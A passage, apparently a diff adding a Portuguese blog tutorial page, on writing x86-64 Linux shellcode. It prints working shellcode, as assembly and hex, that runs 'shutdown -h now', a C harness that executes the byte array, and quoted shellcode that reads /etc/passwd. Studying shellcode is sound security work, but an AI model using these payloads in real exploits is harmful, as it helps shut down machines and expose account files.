+  <span class="mi">400083</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">31</span> <span class="n">d2</span>             	<span class="n">xor</span>    <span class="o">%</span><span class="n">rdx</span><span class="p">,</span><span class="o">%</span><span class="n">rdx</span>
+  <span class="mi">400086</span><span class="o">:</span>	<span class="mi">50</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rax</span>
+  <span class="mi">400087</span><span class="o">:</span>	<span class="mi">6</span><span class="n">a</span> <span class="mi">77</span>                	<span class="n">pushq</span>  <span class="err">$</span><span class="mh">0x77</span>
+  <span class="mi">400089</span><span class="o">:</span>	<span class="mi">66</span> <span class="mi">68</span> <span class="mi">6</span><span class="n">e</span> <span class="mf">6f</span>          	<span class="n">pushw</span>  <span class="err">$</span><span class="mh">0x6f6e</span>
+  <span class="mi">40008</span><span class="nl">d</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e3</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rbx</span>
+  <span class="mi">400090</span><span class="o">:</span>	<span class="mi">50</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rax</span>
+  <span class="mi">400091</span><span class="o">:</span>	<span class="mi">66</span> <span class="mi">68</span> <span class="mi">2</span><span class="n">d</span> <span class="mi">68</span>          	<span class="n">pushw</span>  <span class="err">$</span><span class="mh">0x682d</span>
+  <span class="mi">400095</span><span class="o">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e1</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rcx</span>
+  <span class="mi">400098</span><span class="o">:</span>	<span class="mi">50</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rax</span>
+  <span class="mi">400099</span><span class="o">:</span>	<span class="mi">49</span> <span class="n">b8</span> <span class="mf">2f</span> <span class="mi">73</span> <span class="mi">62</span> <span class="mi">69</span> <span class="mi">6</span><span class="n">e</span> 	<span class="n">movabs</span> <span class="err">$</span><span class="mh">0x2f2f2f6e6962732f</span><span class="p">,</span><span class="o">%</span><span class="n">r8</span>
+  <span class="mi">4000</span><span class="nl">a0</span><span class="p">:</span>	<span class="mf">2f</span> <span class="mf">2f</span> <span class="mf">2f</span> 
+  <span class="mi">4000</span><span class="nl">a3</span><span class="p">:</span>	<span class="mi">49</span> <span class="n">ba</span> <span class="mi">73</span> <span class="mi">68</span> <span class="mi">75</span> <span class="mi">74</span> <span class="mi">64</span> 	<span class="n">movabs</span> <span class="err">$</span><span class="mh">0x6e776f6474756873</span><span class="p">,</span><span class="o">%</span><span class="n">r10</span>
+  <span class="mi">4000</span><span class="nl">aa</span><span class="p">:</span>	<span class="mf">6f</span> <span class="mi">77</span> <span class="mi">6</span><span class="n">e</span> 
+  <span class="mi">4000</span><span class="nl">ad</span><span class="p">:</span>	<span class="mi">41</span> <span class="mi">52</span>                	<span class="n">push</span>   <span class="o">%</span><span class="n">r10</span>
+  <span class="mi">4000</span><span class="nl">af</span><span class="p">:</span>	<span class="mi">41</span> <span class="mi">50</span>                	<span class="n">push</span>   <span class="o">%</span><span class="n">r8</span>
+  <span class="mi">4000</span><span class="nl">b1</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e7</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">4000</span><span class="nl">b4</span><span class="p">:</span>	<span class="mi">52</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rdx</span>
+  <span class="mi">4000</span><span class="nl">b5</span><span class="p">:</span>	<span class="mi">53</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rbx</span>
+  <span class="mi">4000</span><span class="nl">b6</span><span class="p">:</span>	<span class="mi">51</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rcx</span>
+  <span class="mi">4000</span><span class="nl">b7</span><span class="p">:</span>	<span class="mi">57</span>                   	<span class="n">push</span>   <span class="o">%</span><span class="n">rdi</span>
+  <span class="mi">4000</span><span class="nl">b8</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">89</span> <span class="n">e6</span>             	<span class="n">mov</span>    <span class="o">%</span><span class="n">rsp</span><span class="p">,</span><span class="o">%</span><span class="n">rsi</span>
+  <span class="mi">4000</span><span class="nl">bb</span><span class="p">:</span>	<span class="mi">48</span> <span class="mi">83</span> <span class="n">c0</span> <span class="mi">3</span><span class="n">b</span>          	<span class="n">add</span>    <span class="err">$</span><span class="mh">0x3b</span><span class="p">,</span><span class="o">%</span><span class="n">rax</span>
+  <span class="mi">4000</span><span class="nl">bf</span><span class="p">:</span>	<span class="mf">0f</span> <span class="mo">05</span>                	<span class="n">syscall</span> 
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span> <span class="p">.</span><span class="o">/</span><span class="n">shellcode</span><span class="p">.</span><span class="n">sh</span> <span class="n">desligar</span> 
+<span class="s">&quot;</span><span class="se">\x48\x31\xc0\x48\x31\xd2\x50\x6a\x77\x66\x68\x6e\x6f\x48\x89\xe3\x50\x66\x68\x2d\x68\x48</span><span class="s">\</span>
+<span class="s">x89</span><span class="se">\xe1\x50\x49\xb8\x2f\x73\x62\x69\x6e\x2f\x2f\x2f\x49\xba\x73\x68\x75\x74\x64\x6f\x77\x6e</span><span class="s">\</span>
+<span class="s">x41</span><span class="se">\x52\x41\x50\x48\x89\xe7\x52\x53\x51\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05</span><span class="s">&quot;</span>
+<span class="nl">len</span><span class="p">:</span>  <span class="mi">65</span>
+<span class="n">root</span><span class="err">@</span><span class="nl">ChmoSec</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">linux</span><span class="err">#</span></code></pre></div>
+
+<p>Em C fica assim:</p>
+
+<div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="c1">//==================== Código em C ========================</span>
+<span class="cp">#include &lt;stdio.h&gt;</span>
+<span class="cp">#include &lt;string.h&gt;</span>
+ 
+<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">&quot;</span><span class="se">\x48\x31\xc0\x48\x31\xd2\x50\x6a</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x77\x66\x68\x6e\x6f\x48\x89\xe3</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x50\x66\x68\x2d\x68\x48\x89\xe1</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x50\x49\xb8\x2f\x73\x62\x69\x6e</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x2f\x2f\x2f\x49\xba\x73\x68\x75</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x74\x64\x6f\x77\x6e\x41\x52\x41</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x50\x48\x89\xe7\x52\x53\x51\x57</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x48\x89\xe6\x48\x83\xc0\x3b\x0f</span><span class="s">&quot;</span>
+<span class="s">&quot;</span><span class="se">\x05</span><span class="s">&quot;</span><span class="p">;</span>
+ 
+<span class="kt">int</span>
+<span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+ 
+<span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode tamanho:  %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
+<span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">code</span><span class="p">;</span> <span class="c1">// cria ponteiro </span>
+<span class="n">ret</span><span class="p">();</span> 
+ 
+<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></div>
+
+<p>FIca diga um shellcode que executa /etc/passwd.:D</p>
+
+<div class="highlight"><pre><code class="language-asm" data-lang="asm"><span class="nf">BITS</span> <span class="mi">64</span>
+<span class="err">;</span> <span class="nf">Author</span> <span class="no">Mr.Un1k0d3r</span> <span class="p">-</span> <span class="no">RingZer0</span> <span class="no">Team</span>
+<span class="err">;</span> <span class="nf">Read</span> <span class="err">/</span><span class="no">etc</span><span class="err">/</span><span class="no">passwd</span> <span class="no">Linux</span> <span class="no">x86_64</span> <span class="no">Shellcode</span>
+<span class="err">;</span> <span class="nf">Shellcode</span> <span class="no">size</span> <span class="mi">82</span> <span class="no">bytes</span>
+<span class="nf">global</span> <span class="no">_start</span>
+
+<span class="nf">section</span> <span class="no">.text</span>
+
+<span class="nl">_start:</span>
+<span class="nf">jmp</span> <span class="no">_push_filename</span>
+  
+<span class="nl">_readfile:</span>
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">open</span> <span class="no">file</span>
+<span class="nf">pop</span> <span class="no">rdi</span> <span class="err">;</span> <span class="no">pop</span> <span class="no">path</span> <span class="no">value</span>
+<span class="err">;</span> <span class="nf">NULL</span> <span class="no">byte</span> <span class="no">fix</span>
+<span class="nf">xor</span> <span class="no">byte</span> <span class="err">[</span><span class="no">rdi</span> <span class="err">+</span> <span class="mi">11</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x41</span>
+  
+<span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">2</span>
+<span class="nf">xor</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsi</span> <span class="err">;</span> <span class="no">set</span> <span class="no">O_RDONLY</span> <span class="no">flag</span>
+<span class="nf">syscall</span>
+  
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">read</span> <span class="no">file</span>
+<span class="nf">sub</span> <span class="no">sp</span><span class="p">,</span> <span class="mi">0xfff</span>
+<span class="nf">lea</span> <span class="no">rsi</span><span class="p">,</span> <span class="err">[</span><span class="no">rsp</span><span class="err">]</span>
+<span class="nf">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">xor</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rdx</span>
+<span class="nf">mov</span> <span class="no">dx</span><span class="p">,</span> <span class="mi">0xfff</span><span class="err">;</span> <span class="no">size</span> <span class="no">to</span> <span class="no">read</span>
+<span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">syscall</span>
+  
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">write</span> <span class="no">to</span> <span class="no">stdout</span>
+<span class="nf">xor</span> <span class="no">rdi</span><span class="p">,</span> <span class="no">rdi</span>
+<span class="nf">add</span> <span class="no">dil</span><span class="p">,</span> <span class="mi">1</span> <span class="err">;</span> <span class="no">set</span> <span class="no">stdout</span> <span class="no">fd</span> <span class="err">=</span> <span class="mi">1</span>
+<span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">1</span>
+<span class="nf">syscall</span>
+  
+<span class="err">;</span> <span class="nf">syscall</span> <span class="no">exit</span>
+<span class="nf">xor</span> <span class="no">rax</span><span class="p">,</span> <span class="no">rax</span>
+<span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">60</span>
+<span class="nf">syscall</span>
+  
+<span class="nl">_push_filename:</span>
+<span class="nf">call</span> <span class="no">_readfile</span>
+<span class="nl">path:</span> <span class="nf">db</span> <span class="err">&quot;/</span><span class="no">etc</span><span class="err">/</span><span class="no">passwdA</span><span class="err">&quot;</span>
+  
+<span class="nl">Shellcode:</span>
+
+<span class="err">\</span><span class="nf">xeb</span><span class="err">\</span><span class="no">x3f</span><span class="err">\</span><span class="no">x5f</span><span class="err">\</span><span class="no">x80</span><span class="err">\</span><span class="no">x77</span><span class="err">\</span><span class="no">x0b</span><span class="err">\</span><span class="no">x41</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x04</span><span class="err">\</span><span class="no">x02</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xf6</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x05</span><span class="err">\</span><span class="no">x66</span><span class="err">\</span><span class="no">x81</span><span class="err">\</span><span class="no">xec</span><span class="err">\</span><span class="no">xff</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x8d</span><span class="err">\</span><span class="no">x34</span><span class="err">\</span><span class="no">x24</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xc7</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xd2</span><span class="err">\</span><span class="no">x66</span><span class="err">\</span><span class="no">xba</span><span class="err">\</span><span class="no">xff</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x05</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xff</span><span class="err">\</span><span class="no">x40</span><span class="err">\</span><span class="no">x80</span><span class="err">\</span><span class="no">xc7</span><span class="err">\</span><span class="no">x01</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x89</span><span class="err">\</span><span class="no">xc2</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x04</span><span class="err">\</span><span class="no">x01</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x05</span><span class="err">\</span><span class="no">x48</span><span class="err">\</span><span class="no">x31</span><span class="err">\</span><span class="no">xc0</span><span class="err">\</span><span class="no">x04</span><span class="err">\</span><span class="no">x3c</span><span class="err">\</span><span class="no">x0f</span><span class="err">\</span><span class="no">x05</span><span class="err">\</span><span class="no">xe8</span><span class="err">\</span><span class="no">xbc</span><span class="err">\</span><span class="no">xff</span><span class="err">\</span><span class="no">xff</span><span class="err">\</span><span class="no">xff</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x65</span><span class="err">\</span><span class="no">x74</span><span class="err">\</span><span class="no">x63</span><span class="err">\</span><span class="no">x2f</span><span class="err">\</span><span class="no">x70</span><span class="err">\</span><span class="no">x61</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x73</span><span class="err">\</span><span class="no">x77</span><span class="err">\</span><span class="no">x64</span><span class="err">\</span><span class="no">x41</span></code></pre></div>
+
+<h3>Conclusão</h3>
+<p>Desenvolver shellcode's funcionais, e sem bad char pode ser uma tarefa muito produtiva uma vez que você entende como tudo funciona da pra fazer muita coisa existe mais de 100 syscall que você trabalhar e tentar desenvolver mesmo que com grande quantidade de 0x00, mas para estudos tudo vale a pena, shellcodes podem ser poderosos muito mais que você imagina, esse artigo foi direcionado para quem já tem conhecimento básico de desenvolvimento de shellcode  e quer migrar para 64 bit, recomendo dar uma lida no artigo sobre shellcode avançados onde mostro técnicas que podem ajudar para economizar bytes, que não foi o foco desse artigo, quem sabe futuramente dou um update para um paper completo, e aprofundamos mais nesse assunto. fico por aqui abraços :D </p>
+<pre>
+Referências: 
+http://phrack.org/issues/57/5.html
+http://crypto.stanford.edu/~blynn/rop/
+http://turkeyland.net/projects/overflow/shell.php
+</pre>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#assembly-ref">
+					assembly <span>(3)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#shellcode-ref">
+					shellcode <span>(3)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#syscall 64 bit-ref">
+					syscall 64 bit <span>(1)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=Shellcode 64 ASM Language Developing&via=mh4x0f"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="http://avatars.githubusercontent.com/u/6795613" style="width:80px;height:80px;" class="img-rounded author-image" />
+        <h4 class="section-title author-name">mh4x0f</h4>
+        <p class="author-bio">One 0x41414141 worth a thousand words</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/linux/2014/10/14/Bypass-Protect-winndows-Linux-metasploit-%5BDEP.html" title="Bypass Windows e Linux + metasploit [DEP ASLR]">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/c%20programming/2014/12/03/socket-raw-e-encapsulamento-de-dados-x0c7.html" title="Socket Raw e encapsulamento de Dados 0xc7">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+    
+<div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'mh4x0fblog';
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2015 mh4x0f with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl =
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'mh4x0f']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
